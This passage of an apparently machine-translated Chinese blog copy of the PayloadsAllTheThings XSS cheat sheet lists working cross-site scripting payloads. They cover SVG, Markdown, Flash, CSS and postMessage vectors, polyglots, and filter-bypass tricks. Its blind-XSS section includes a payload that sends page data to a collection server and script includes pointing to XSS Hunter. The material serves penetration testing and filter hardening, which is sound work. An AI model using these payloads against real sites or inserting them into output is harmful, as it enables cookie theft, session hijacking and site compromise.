<h3 id="-20"><a href="#-20" class="headerlink" title=""></a></h3><h3 id="SVG中的XSS"><a href="#SVG中的XSS" class="headerlink" title="SVG中的XSS"></a>SVG中的XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">  &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    alert(document.domain);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-21"><a href="#-21" class="headerlink" title=""></a></h3><h3 id="SVG中的XSS（短）"><a href="#SVG中的XSS（短）" class="headerlink" title="SVG中的XSS（短）"></a>SVG中的XSS（短）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(document.domain)&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg&gt;&lt;desc&gt;&lt;![CDATA[&lt;/desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;&lt;/svg&gt;</span><br><span class="line">&lt;svg&gt;&lt;foreignObject&gt;&lt;![CDATA[&lt;/foreignObject&gt;&lt;script&gt;alert(2)&lt;/script&gt;]]&gt;&lt;/svg&gt;</span><br><span class="line">&lt;svg&gt;&lt;title&gt;&lt;![CDATA[&lt;/title&gt;&lt;script&gt;alert(3)&lt;/script&gt;]]&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-22"><a href="#-22" class="headerlink" title=""></a></h3><h3 id="降价中的XSS"><a href="#降价中的XSS" class="headerlink" title="降价中的XSS"></a>降价中的XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[a](javascript:prompt(document.cookie))</span><br><span class="line">[a](j a v a s c r i p t:prompt(document.cookie))</span><br><span class="line">[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)</span><br><span class="line">[a](javascript:window.onerror=alert;throw%201)</span><br></pre></td></tr></table></figure>

<h3 id="-23"><a href="#-23" class="headerlink" title=""></a></h3><h3 id="SWF-Flash应用程序中的XSS"><a href="#SWF-Flash应用程序中的XSS" class="headerlink" title="SWF Flash应用程序中的XSS"></a>SWF Flash应用程序中的XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);</span><br><span class="line">IE8: http://0me.me/demo/xss/xssproject.swf?js=try&#123;alert(document.domain)&#125;catch(e)&#123; window.open(‘?js=history.go(-1)’,’_self’);&#125;</span><br><span class="line">IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);</span><br></pre></td></tr></table></figure>

<p>.&#x2F;文件中的更多有效负载</p>
<h3 id="-24"><a href="#-24" class="headerlink" title=""></a></h3><h3 id="SWF-Flash应用程序中的XSS-1"><a href="#SWF-Flash应用程序中的XSS-1" class="headerlink" title="SWF Flash应用程序中的XSS"></a>SWF Flash应用程序中的XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flashmediaelement.swf?jsinitfunctio%gn=alert`1`</span><br><span class="line">flashmediaelement.swf?jsinitfunctio%25gn=alert(1)</span><br><span class="line">ZeroClipboard.swf?id=\&quot;))&#125; catch(e) &#123;alert(1);&#125;//&amp;width=1000&amp;height=1000</span><br><span class="line">swfupload.swf?movieName=&quot;]);&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1);//</span><br><span class="line">swfupload.swf?buttonText=test&lt;a href=&quot;javascript:confirm(1)&quot;&gt;&lt;img src=&quot;https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg&quot;/&gt;&lt;/a&gt;&amp;.swf</span><br><span class="line">plupload.flash.swf?%#target%g=alert&amp;uid%g=XSS&amp;</span><br><span class="line">moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true</span><br><span class="line">video-js.swf?readyFunction=alert(1)</span><br><span class="line">player.swf?playerready=alert(document.cookie)</span><br><span class="line">player.swf?tracecall=alert(document.cookie)</span><br><span class="line">banner.swf?clickTAG=javascript:alert(1);//</span><br><span class="line">io.swf?yid=\&quot;));&#125;catch(e)&#123;alert(1);&#125;//</span><br><span class="line">video-js.swf?readyFunction=alert%28document.domain%2b&#x27;%20XSSed!&#x27;%29</span><br><span class="line">bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4</span><br><span class="line">flashcanvas.swf?id=test\&quot;));&#125;catch(e)&#123;alert(document.domain)&#125;//</span><br><span class="line">phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));&#125;catch(e)&#123;alert(document.domain)&#125;//</span><br></pre></td></tr></table></figure>

<h3 id="-25"><a href="#-25" class="headerlink" title=""></a></h3><h3 id="CSS-中-的-XSS"><a href="#CSS-中-的-XSS" class="headerlink" title="CSS 中 的 XSS"></a>CSS 中 的 XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">div  &#123;</span><br><span class="line">    background-image: url(&quot;data:image/jpg;base64,&lt;\/style&gt;&lt;svg/onload=alert(document.domain)&gt;&quot;);</span><br><span class="line">    background-color: #cccccc;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div&gt;lol&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="-26"><a href="#-26" class="headerlink" title=""></a></h2><h2 id="发布-消息-中-的-XSS"><a href="#发布-消息-中-的-XSS" class="headerlink" title="发布 消息 中 的 XSS"></a>发布 消息 中 的 XSS</h2><blockquote>
<p>  如果 目标 来源 是 星号 * ， 则 消息 可以 发送 到 任何 引用 了 该 子 页面 的 域 。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;input type=button value=&quot;Click Me&quot; id=&quot;btn&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&#x27;btn&#x27;).onclick = function(e)&#123;</span><br><span class="line">    window.poc = window.open(&#x27;http://www.redacted.com/#login&#x27;);</span><br><span class="line">    setTimeout(function()&#123;</span><br><span class="line">        window.poc.postMessage(</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;sender&quot;: &quot;accounts&quot;,</span><br><span class="line">                &quot;url&quot;: &quot;javascript:confirm(&#x27;XSS&#x27;)&quot;,</span><br><span class="line">            &#125;,</span><br><span class="line">            &#x27;*&#x27;</span><br><span class="line">        );</span><br><span class="line">    &#125;, 2000);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="-27"><a href="#-27" class="headerlink" title=""></a></h2><h2 id="盲-XSS"><a href="#盲-XSS" class="headerlink" title="盲 XSS"></a>盲 XSS</h2><h3 id="-28"><a href="#-28" class="headerlink" title=""></a></h3><h3 id="XSS-猎人"><a href="#XSS-猎人" class="headerlink" title="XSS 猎人"></a>XSS 猎人</h3><p>XSS Hunter已弃用，可从以下位置获得<a href="https://xsshunter.com/app%E3%80%82%E6%82%A8%E5%8F%AF%E4%BB%A5%E4%BB%8E[%E5%BC%BA%E5%88%B6%E7%A8%8B%E5%BA%8F%E5%91%98/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)">https://xsshunter.com/app。您可以从[强制程序员/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)</a></p>
<blockquote>
<p>  XSS Hunter允许您查找所有类型的跨站点脚本漏洞，包括经常被遗漏的盲XSS。该服务通过托管专门的XSS探测器来工作，这些探测器在启动时扫描页面并将有关有漏洞页面的信息发送到XSS Hunter服务。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script src=//&lt;your.subdomain&gt;.xss.ht&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;$.getScript(&quot;//&lt;your.subdomain&gt;.xss.ht&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-29"><a href="#-29" class="headerlink" title=""></a></h3><h3 id="其他Blind-XSS工具"><a href="#其他Blind-XSS工具" class="headerlink" title="其他Blind XSS工具"></a>其他Blind XSS工具</h3><ul>
<li><a href="https://github.com/Netflix-Skunkworks/sleepy-puppy">贪睡的小狗</a></li>
<li><a href="https://github.com/LewisArdern/bXSS">bXSS -刘易斯·阿德恩</a></li>
<li><a href="https://github.com/ssl/ezXSS">ezXSS -安全套接字</a></li>
</ul>
<h3 id="-30"><a href="#-30" class="headerlink" title=""></a></h3><h3 id="盲XSS终点"><a href="#盲XSS终点" class="headerlink" title="盲XSS终点"></a>盲XSS终点</h3><ul>
<li>联系表格</li>
<li>票证支持</li>
<li>引用站点标题<ul>
<li>自定义站点分析</li>
<li>管理面板日志</li>
</ul>
</li>
<li>用户代理<ul>
<li>自定义站点分析</li>
<li>管理面板日志</li>
</ul>
</li>
<li>注解方块<ul>
<li>管理面板</li>
</ul>
</li>
</ul>
<h3 id="-31"><a href="#-31" class="headerlink" title=""></a></h3><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>您可以使用[XSS的数据抓取器](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS</a> Injection#data-grabber-for-xss) 和一个在线HTTP服务器，以在部署一个重型blind-XSS测试工具之前确认一个blind-XSS的存在。</p>
<p>例如，有效载荷</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location=&#x27;http://10.10.14.30:8080/XSS/grabber.php?c=&#x27;+document.domain&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>例如，单行HTTP服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ruby -run -ehttpd . -p8080</span><br></pre></td></tr></table></figure>

<h2 id="-32"><a href="#-32" class="headerlink" title=""></a></h2><h2 id="突变的XSS"><a href="#突变的XSS" class="headerlink" title="突变的XSS"></a>突变的XSS</h2><p>使用浏览器的怪癖重新创建一些HTML标记，当它位于<code>element.innerHTML</code>。</p>
<p>Masato Kinugawa的XSS变体，用于Google搜索中的DOMPuriify组件。技术博客可在<a href="https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/">https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/</a> 和<a href="https://research.securitum.com/dompurify-bypass-using-mxss/%E3%80%82">https://research.securitum.com/dompurify-bypass-using-mxss/。</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;noscript&gt;&lt;p title=&quot;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="-33"><a href="#-33" class="headerlink" title=""></a></h2><h2 id="多国-语言-XSS"><a href="#多国-语言-XSS" class="headerlink" title="多国 语言 XSS"></a>多国 语言 XSS</h2><p>多国语言XSS - 0xsobky</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jaVasCript:/*-/*`/*\`/*&#x27;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span><br></pre></td></tr></table></figure>

<p>多国语言XSS - Ashar Javed</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;&quot; &gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;&#x27;--&gt;&quot; &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;img/id=&quot;confirm&amp;lpar; 1)&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id&amp;%23x29;&gt;&#x27;&quot;&gt;&lt;img src=&quot;http: //i.imgur.com/P8mL8.jpg&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>多语XSS -马蒂亚斯·卡尔松</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; onclick=alert(1)//&lt;button ‘ onclick=alert(1)//&gt; */ alert(1)//</span><br></pre></td></tr></table></figure>

<p>多国语言XSS - Rsnake</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;alert(String.fromCharCode(88,83,83))//&#x27;;alert(String. fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode (88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>

<p>多语种XSS -丹尼尔·米斯勒</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;alert(String.fromCharCode(88,83,83))//&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</span><br><span class="line">“ onclick=alert(1)//&lt;button ‘ onclick=alert(1)//&gt; */ alert(1)//</span><br><span class="line">&#x27;&quot;&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;&quot;&gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)&gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;&#x27;--&gt;&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;img/id=&quot;confirm&amp;lpar;1)&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id&amp;%23x29;&gt;&#x27;&quot;&gt;&lt;img src=&quot;http://i.imgur.com/P8mL8.jpg&quot;&gt;</span><br><span class="line">javascript://&#x27;/&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;--&gt;&lt;p&quot; onclick=alert()//&gt;*/alert()/*</span><br><span class="line">javascript://--&gt;&lt;/script&gt;&lt;/title&gt;&lt;/style&gt;&quot;/&lt;/textarea&gt;*/&lt;alert()/*&#x27; onclick=alert()//&gt;a</span><br><span class="line">javascript://&lt;/title&gt;&quot;/&lt;/script&gt;&lt;/style&gt;&lt;/textarea/--&gt;*/&lt;alert()/*&#x27; onclick=alert()//&gt;/</span><br><span class="line">javascript://&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;--&gt;&lt;/script&gt;&lt;a&quot;//&#x27; onclick=alert()//&gt;*/alert()/*</span><br><span class="line">javascript://&#x27;//&quot; --&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/script&gt;&lt;/title&gt;&lt;b onclick= alert()//&gt;*/alert()/*</span><br><span class="line">javascript://&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/script --&gt;&lt;li &#x27;//&quot; &#x27;*/alert()/*&#x27;, onclick=alert()//</span><br><span class="line">javascript:alert()//--&gt;&lt;/script&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/title&gt;&lt;a&quot;//&#x27; onclick=alert()//&gt;*/alert()/*</span><br><span class="line">--&gt;&lt;/script&gt;&lt;/title&gt;&lt;/style&gt;&quot;/&lt;/textarea&gt;&lt;a&#x27; onclick=alert()//&gt;*/alert()/*</span><br><span class="line">/&lt;/title/&#x27;/&lt;/style/&lt;/script/&lt;/textarea/--&gt;&lt;p&quot; onclick=alert()//&gt;*/alert()/*</span><br><span class="line">javascript://--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;svg &quot;//&#x27; onclick=alert()//</span><br><span class="line">/&lt;/title/&#x27;/&lt;/style/&lt;/script/--&gt;&lt;p&quot; onclick=alert()//&gt;*/alert()/*</span><br></pre></td></tr></table></figure>

<p>多国语言XSS -<a href="https://twitter.com/s0md3v/status/966175714302144514">@s0md3v</a> <a href="https://camo.githubusercontent.com/b58e22df93666d752bea8d1e375700f97843e2159fc4f6c514810c3471a4dabb/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f4457694c6b335558344145306a4a732e6a7067"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://camo.githubusercontent.com/b58e22df93666d752bea8d1e375700f97843e2159fc4f6c514810c3471a4dabb/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f4457694c6b335558344145306a4a732e6a7067" alt="https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg"></a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--&gt;&#x27;&quot;/&gt;&lt;/sCript&gt;&lt;svG x=&quot;&gt;&quot; onload=(co\u006efirm)``&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://camo.githubusercontent.com/5d42b0405f121fe2fdb0bbe86855108a5fc0df91cf2575b0adb7b7a43fc18a63/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44576649697a4d56774145326230672e6a70673a6c61726765"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://camo.githubusercontent.com/5d42b0405f121fe2fdb0bbe86855108a5fc0df91cf2575b0adb7b7a43fc18a63/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44576649697a4d56774145326230672e6a70673a6c61726765" alt="https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large"></a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg%0Ao%00nload=%09((pro\u006dpt))()//</span><br></pre></td></tr></table></figure>

<p>多国语言XSS -来自<a href="http://polyglot.innerht.ml/">@filedescriptor的多国语言挑战</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># by crlf</span><br><span class="line">javascript:&quot;/*&#x27;/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html \&quot; onmouseover=/*&amp;lt;svg/*/onload=alert()//&gt;</span><br><span class="line"></span><br><span class="line"># by europa</span><br><span class="line">javascript:&quot;/*&#x27;/*`/*\&quot; /*&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/noscript&gt;&lt;/noembed&gt;&lt;/template&gt;&lt;/script/--&gt;&amp;lt;svg/onload=/*&lt;html/*/onmouseover=alert()//&gt;</span><br><span class="line"></span><br><span class="line"># by EdOverflow</span><br><span class="line">javascript:&quot;/*\&quot;/*`/*&#x27; /*&lt;/template&gt;&lt;/textarea&gt;&lt;/noembed&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/style&gt;&lt;/script&gt;--&gt;&amp;lt;svg onload=/*&lt;html/*/onmouseover=alert()//&gt;</span><br><span class="line"></span><br><span class="line"># by h1/ragnar</span><br><span class="line">javascript:`//&quot;//\&quot;//&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/noscript&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;/template&gt;&amp;lt;svg/onload=&#x27;/*--&gt;&lt;html */ onmouseover=alert()//&#x27;&gt;`</span><br></pre></td></tr></table></figure>

<p>多国语言XSS -来自<a href="https://brutelogic.com.br/blog/building-xss-polyglots/">野兽逻辑学</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JavaScript://%250Aalert?.(1)//&#x27;/*\&#x27;/*&quot;/*\&quot;/*`/*\`/*%26apos;)/*&lt;!--&gt;&lt;/Title/&lt;/Style/&lt;/Script/&lt;/textArea/&lt;/iFrame/&lt;/noScript&gt;\74k&lt;K/contentEditable/autoFocus/OnFocus=/*$&#123;/*/;&#123;/**/(alert)(1)&#125;//&gt;&lt;Base/Href=//X55.is\76--&gt;</span><br></pre></td></tr></table></figure>

<h2 id="-34"><a href="#-34" class="headerlink" title=""></a></h2><h2 id="过滤器旁路和外来有效负载"><a href="#过滤器旁路和外来有效负载" class="headerlink" title="过滤器旁路和外来有效负载"></a>过滤器旁路和外来有效负载</h2><h3 id="-35"><a href="#-35" class="headerlink" title=""></a></h3><h3 id="旁路区分大小写"><a href="#旁路区分大小写" class="headerlink" title="旁路区分大小写"></a>旁路区分大小写</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-36"><a href="#-36" class="headerlink" title=""></a></h3><h3 id="绕过标签黑名单"><a href="#绕过标签黑名单" class="headerlink" title="绕过标签黑名单"></a>绕过标签黑名单</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script x&gt;</span><br><span class="line">&lt;script x&gt;alert(&#x27;XSS&#x27;)&lt;script y&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-37"><a href="#-37" class="headerlink" title=""></a></h3><h3 id="使用代码计算绕过单词黑名单"><a href="#使用代码计算绕过单词黑名单" class="headerlink" title="使用代码计算绕过单词黑名单"></a>使用代码计算绕过单词黑名单</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(&#x27;ale&#x27;+&#x27;rt(0)&#x27;);</span><br><span class="line">Function(&quot;ale&quot;+&quot;rt(1)&quot;)();</span><br><span class="line">new Function`al\ert\`6\``;</span><br><span class="line">setTimeout(&#x27;ale&#x27;+&#x27;rt(2)&#x27;);</span><br><span class="line">setInterval(&#x27;ale&#x27;+&#x27;rt(10)&#x27;);</span><br><span class="line">Set.constructor(&#x27;ale&#x27;+&#x27;rt(13)&#x27;)();</span><br><span class="line">Set.constructor`al\x65rt\x2814\x29```;</span><br></pre></td></tr></table></figure>

<h3 id="-38"><a href="#-38" class="headerlink" title=""></a></h3><h3 id="略过不完整的html标签"><a href="#略过不完整的html标签" class="headerlink" title="略过不完整的html标签"></a>略过不完整的html标签</h3><p>适用于IE&#x2F;Firefox&#x2F;Chrome&#x2F;Safari浏览器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&#x27;1&#x27; onerror=&#x27;alert(0)&#x27; &lt;</span><br></pre></td></tr></table></figure>

<h3 id="-39"><a href="#-39" class="headerlink" title=""></a></h3><h3 id="字符串不使用引号"><a href="#字符串不使用引号" class="headerlink" title="字符串不使用引号"></a>字符串不使用引号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String.fromCharCode(88,83,83)</span><br></pre></td></tr></table></figure>

<h3 id="-40"><a href="#-40" class="headerlink" title=""></a></h3><h3 id="绕过脚本标记中的引号"><a href="#绕过脚本标记中的引号" class="headerlink" title="绕过脚本标记中的引号"></a>绕过脚本标记中的引号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/bla.php?test=&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    &lt;?php echo &#x27;foo=&quot;text &#x27;.$_GET[&#x27;test&#x27;].&#x27;&quot;;&#x27;;`?&gt;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-41"><a href="#-41" class="headerlink" title=""></a></h3><h3 id="在mousedown事件中绕过引号"><a href="#在mousedown事件中绕过引号" class="headerlink" title="在mousedown事件中绕过引号"></a>在mousedown事件中绕过引号</h3><p>您可以在onmousedown事件处理程序中使用’绕过单引号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&quot; onmousedown=&quot;var name = &#x27;&amp;#39;;alert(1)//&#x27;; alert(&#x27;smthg&#x27;)&quot;&gt;Link&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-42"><a href="#-42" class="headerlink" title=""></a></h3><h3 id="旁通点式过滤器"><a href="#旁通点式过滤器" class="headerlink" title="旁通点式过滤器"></a>旁通点式过滤器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window[&#x27;alert&#x27;](document[&#x27;domain&#x27;])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>将IP地址转换为十进制格式：即：<code>http://192.168.1.1</code> 你好<code>http://3232235777</code> <a href="http://www.geektools.com/cgi-bin/ipconv.cgi">http://www.geektools.com/cgi-bin/ipconv.cgi</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;eval(atob(&quot;YWxlcnQoZG9jdW1lbnQuY29va2llKQ==&quot;))&lt;script&gt;</span><br></pre></td></tr></table></figure>

<p>使用Linux命令对XSS有效负载进行Base64编码：即：<code>echo -n &quot;alert(document.cookie)&quot; | base64</code> 你好<code>YWxlcnQoZG9jdW1lbnQuY29va2llKQ==</code></p>
<h3 id="-43"><a href="#-43" class="headerlink" title=""></a></h3><h3 id="绕过字符串的括号"><a href="#绕过字符串的括号" class="headerlink" title="绕过字符串的括号"></a>绕过字符串的括号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert`1`</span><br><span class="line">setTimeout`alert\u0028document.domain\u0029`;</span><br></pre></td></tr></table></figure>

<h3 id="-44"><a href="#-44" class="headerlink" title=""></a></h3><h3 id="绕过括号和分号"><a href="#绕过括号和分号" class="headerlink" title="绕过括号和分号"></a>绕过括号和分号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// From @garethheyes</span><br><span class="line">&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;</span><br><span class="line">&lt;script&gt;&#123;onerror=alert&#125;throw 1337&lt;/script&gt;</span><br><span class="line">&lt;script&gt;throw onerror=alert,&#x27;some string&#x27;,123,&#x27;haha&#x27;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// From @terjanq</span><br><span class="line">&lt;script&gt;throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// From @cgvwzq</span><br><span class="line">&lt;script&gt;TypeError.prototype.name =&#x27;=/&#x27;,0[onerror=eval][&#x27;/-alert(1)//&#x27;]&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-45"><a href="#-45" class="headerlink" title=""></a></h3><h3 id="绕过onxxxx-x3D-黑名单"><a href="#绕过onxxxx-x3D-黑名单" class="headerlink" title="绕过onxxxx&#x3D;黑名单"></a>绕过onxxxx&#x3D;黑名单</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;object onafterscriptexecute=confirm(0)&gt;</span><br><span class="line">&lt;object onbeforescriptexecute=confirm(0)&gt;</span><br><span class="line"></span><br><span class="line">// Bypass onxxx= filter with a null byte/vertical tab</span><br><span class="line">&lt;img src=&#x27;1&#x27; onerror\x00=alert(0) /&gt;</span><br><span class="line">&lt;img src=&#x27;1&#x27; onerror\x0b=alert(0) /&gt;</span><br><span class="line"></span><br><span class="line">// Bypass onxxx= filter with a &#x27;/&#x27;</span><br><span class="line">&lt;img src=&#x27;1&#x27; onerror/=alert(0) /&gt;</span><br></pre></td></tr></table></figure>

